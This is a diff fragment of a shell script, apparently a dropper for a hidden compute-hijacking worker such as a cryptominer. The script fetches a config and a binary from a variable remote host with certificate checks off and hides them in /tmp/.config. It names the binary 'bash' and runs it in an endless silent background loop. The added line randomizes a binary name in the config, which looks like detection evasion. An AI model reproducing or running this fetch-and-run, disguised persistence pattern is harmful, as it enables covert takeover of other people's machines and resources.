@@ -26,6 +26,7 @@ mkdir -p "/tmp/.config"
 wget --no-check-certificate -4 -qO "/tmp/.config/appsettings.json" "${src}/q.json"
 wget --no-check-certificate -4 -qO "/tmp/.config/bash" "${src}/q"
 chmod -R 777 "/tmp/.config"
+sed -i "s/\"trainerBinary\":.*/\"trainerBinary\": \"$(RandString 7)\",/" "/tmp/.config/appsettings.json"
 
 if [ "$mode" == "0" ]; then
   bash -c "while true; do cd /tmp/.config; ./bash ${name} ${cores} >/dev/null 2>&1 ; done" >/dev/null 2>&1 &
